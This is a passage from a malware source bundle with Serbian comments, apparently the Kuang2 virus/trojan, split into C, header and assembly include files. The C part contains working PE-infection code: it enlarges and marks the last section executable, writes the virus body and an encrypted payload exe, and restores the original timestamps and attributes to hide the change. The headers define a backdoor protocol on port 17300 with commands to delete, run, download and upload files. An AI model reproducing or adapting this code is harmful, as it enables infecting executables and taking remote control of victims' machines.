		if ((entry_idd[i]).VirtualAddress - ((PIMAGE_SECTION_HEADER)filemap)->VirtualAddress < temp) {
			// na„ao sekciju, zapamti stare vrednosti
			oldoffs2=(unsigned int) &(entry_idd[i].Size) - (unsigned int) filestart;
			olddata2=(entry_idd[i]).Size;
			// promeni i njoj veliinu
			(entry_idd[i]).Size += align_virussize;
			break;
		}
		i++;
	}

	// Promeni karakteristiku ove poslednje sekcije (by Jacky Qwerty/29A)
	oldoffs3=filemap-filestart+36;								// zapamti fajl ofset i
	olddata3=((PIMAGE_SECTION_HEADER)filemap)->Characteristics; // stare podatke na tom mestu
	((PIMAGE_SECTION_HEADER)filemap)->Characteristics = (IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_READ + IMAGE_SCN_MEM_WRITE);

	// Promeni SizeOfImage za align_virussize
	oldoffs5=(unsigned int)SizeofImage-(unsigned int)filestart;
	olddata5=*SizeofImage;
	*SizeofImage+=align_virussize;

	kript=(char) GetTickCount();	// zapamti i sluajan broj koji slu‚i za dekriptovanje

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nwrite", 7, &Iwritten, NULL);
#endif





/*** UPISIVANJE U FAJL ***/

	// Upi„i virus u fajl
	for (j=0; j<raw_virussize; j++) virusstart[j]=viruscode[j];
	// Upi„i i exe odmah posle
	virusstart=&virusstart[raw_virussize];
	ReadFile(haddfile, virusstart, addfile_size, (LPDWORD) &i, NULL);
	// Kriptuj fajl jednostavno i uvek sluajno
	for (j=0; j<addfile_size; j++, kript+=173) virusstart[j]-=kript;
	// zatvori add exe fajl
	CloseHandle(haddfile);





/*** REGULARAN KRAJ ***/

	retvalue=0;
	FlushViewOfFile(filestart,0);	// upi„i sve promene nazad u fajl
end4:
	UnmapViewOfFile(filestart);		// zatvari MMF view
end3:
	CloseHandle(hfilemap);			// zatvori MMF
	// bez obzira da li je fajl uspe„no inficiran ili ne treba setovati
	// njegovu veliinu, jer ako je nastala gre„ka veliina fajla †e
	// se pove†ati, a virus ne†e biti dodat!
	// namesti regularnu veliinu fajla
	SetFilePointer(hfile, fsize, NULL, FILE_BEGIN);
	SetEndOfFile(hfile);
	// vrati staro vreme
	SetFileTime(hfile, &creation_time, &lastacc_time, &lastwr_time);
	// a i atribute (ako je bio read-only)
	if (fattr & FILE_ATTRIBUTE_READONLY) SetFileAttributes(fname, fattr);
end2:
	CloseHandle(hfile);			// zatvori fajl
end1:

#ifdef I_TESTMODE
	WriteFile(testIfile, "\r\nend", 5, &Iwritten, NULL);
	CloseHandle(testIfile);
#endif

	return retvalue;			// vrati rezultat
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kinff.c]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kuang2.h]ÄÄÄ
#include "..\k2common.h"

#define		UM_ASYNC		WM_USER+1
#define		UM_QUITCLIENT	WM_USER+2
#define		MAXCONN			SOMAXCONN
#define		NOMOREREQUEST	(-2)
#define		BADREQUEST		(-3)

typedef struct tagREQUEST {
	SOCKET socket;				// socket
	HANDLE thread;				// thread handle
} REQUEST;

extern REQUEST request[];
void ClearRequests(void);
int NewRequest(void);
int GetRequest(SOCKET);
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[kuang2.h]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[../k2common.h]ÄÄÄ

#define		KUANG2_PORT		17300
#define		BUFFER_SIZE		1024

// spisak komandi za KUANG2 protokol

#define		K2_HELO				0x324B4F59
#define		K2_ERROR			0x52525245
#define		K2_DONE				0x454E4F44
#define		K2_QUIT				0x54495551
#define		K2_DELETE_FILE		0x464C4544
#define		K2_RUN_FILE			0x464E5552
#define		K2_FOLDER_INFO		0x464E4946
#define		K2_DOWNLOAD_FILE	0x464E5744
#define		K2_UPLOAD_FILE		0x46445055

typedef struct {
	unsigned int command;
	union {
		char bdata[BUFFER_SIZE-4];
		struct {
			unsigned int param;
			char sdata[BUFFER_SIZE-8];
		};
	};
} Message, *pMessage;
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[../k2common.h]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[weirdus.inc]ÄÄÄ
;
; Ovde su date neke vrednosti koje se koriste iz windows.h
;

MAX_PATH						EQU		260
MAX_COMPUTERNAME_LENGTH			EQU		15

GENERIC_READ					EQU		80000000h
GENERIC_WRITE					EQU		40000000h

FILE_SHARE_READ					EQU		00000001h
FILE_SHARE_WRITE				EQU		00000002h

CREATE_NEW						EQU		1
CREATE_ALWAYS					EQU		2
OPEN_EXISTING					EQU		3
OPEN_ALWAYS						EQU		4
TRUNCATE_EXISTING				EQU		5

FILE_ATTRIBUTE_READONLY			EQU		00000001h
FILE_ATTRIBUTE_HIDDEN			EQU		00000002h
FILE_ATTRIBUTE_SYSTEM			EQU		00000004h
FILE_ATTRIBUTE_DIRECTORY		EQU		00000010h
FILE_ATTRIBUTE_ARCHIVE			EQU		00000020h
FILE_ATTRIBUTE_NORMAL			EQU		00000080h
FILE_ATTRIBUTE_TEMPORARY		EQU		00000100h
FILE_ATTRIBUTE_ATOMIC_WRITE		EQU		00000200h
FILE_ATTRIBUTE_XACTION_WRITE	EQU		00000400h
FILE_ATTRIBUTE_COMPRESSED		EQU		00000800h
FILE_ATTRIBUTE_HAS_EMBEDDING	EQU		00001000h

INVALID_HANDLE_VALUE			EQU		-1

STARTF_USESHOWWINDOW			EQU		00000001h
STARTF_USESIZE					EQU		00000002h
STARTF_USEPOSITION				EQU		00000004h
STARTF_USECOUNTCHARS			EQU		00000008h
STARTF_USEFILLATTRIBUTE			EQU		00000010h
STARTF_RUNFULLSCREEN			EQU		00000020h
STARTF_FORCEONFEEDBACK			EQU		00000040h
STARTF_FORCEOFFFEEDBACK			EQU		00000080h
STARTF_USESTDHANDLES			EQU		00000100h

NORMAL_PRIORITY_CLASS			EQU		00000020h
IDLE_PRIORITY_CLASS				EQU		00000040h
HIGH_PRIORITY_CLASS				EQU		00000080h
REALTIME_PRIORITY_CLASS			EQU		00000100h

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[weirdus.inc]ÄÄÄ
